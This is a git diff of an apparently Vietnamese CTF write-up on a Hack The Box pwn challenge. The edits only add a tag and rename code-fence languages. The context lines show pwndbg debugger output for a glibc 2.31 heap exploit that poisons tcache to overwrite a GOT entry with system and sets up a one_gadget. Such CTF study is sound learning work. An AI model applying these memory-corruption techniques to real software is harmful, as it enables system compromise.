@@ -4,6 +4,7 @@ categories:
   - Pwnable
 tags:
   - Pwn
+  - HTB
 published: true
 ---
 
@@ -149,7 +150,7 @@ Chương trình xử lý theo dạng cộng/trừ nên ta không cần leak memo
 
 ### Cách 1: Leakless
 [Hàm puts có gọi tới một abs@got trỏ tới strlen: ](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/ioputs.c#L35)
-```x86asm
+```assembly
 pwndbg> x/10i puts
    0x7f5203fe6420 <__GI__IO_puts>:	endbr64 
    0x7f5203fe6424 <__GI__IO_puts+4>:	push   r14
@@ -189,7 +190,7 @@ Tất nhiên đoán trước hàm puts sẽ khó có các thanh ghi nào thoả 
 
 Mình thử để tcachebin[0]=got-0x10 ghi đè got thành system rồi kiểm tra
 
-```x86asm
+```assembly
  RAX  0x0
  RBX  0x55b98b4e3620 (__libc_csu_init) ◂— endbr64 
 *RCX  0x7f77d944f0a8 (*ABS*@got.plt) —▸ 0x7f77d92b5290 (system) ◂— endbr64 
@@ -213,7 +214,7 @@ Mình thử để tcachebin[0]=got-0x10 ghi đè got thành system rồi kiểm 
    0x7f77d92b5297 <system+7>        je     system+16                <system+16>
 
 ```
-```x86asm
+```assembly
 pwndbg> tele 0x7f77d944f098
 00:0000│     0x7f77d944f098 (*ABS*@got.plt) —▸ 0x7f77d93e7950 (__memrchr_avx2) ◂— endbr64 
 01:0008│     0x7f77d944f0a0 (__tunable_get_val@got.plt) ◂— 0x0
@@ -244,7 +245,7 @@ got_target + 0x20|  .....
 
 Giờ mình muốn `$rsi=0` để thoả mãn one_gadget `0xe3b04`, sau một hồi mò mẫm, mình thấy được đoạn code hữu ích.
 
-```x86asm 
+```assembly
 pwndbg> x/3i 0x7f0a75cd9deb
    0x7f0a75cd9deb <__libc_calloc+731>:	xor    esi,esi
    0x7f0a75cd9ded <__libc_calloc+733>:	call   0x7f0a75c60560 <*ABS*+0xa0540@plt>
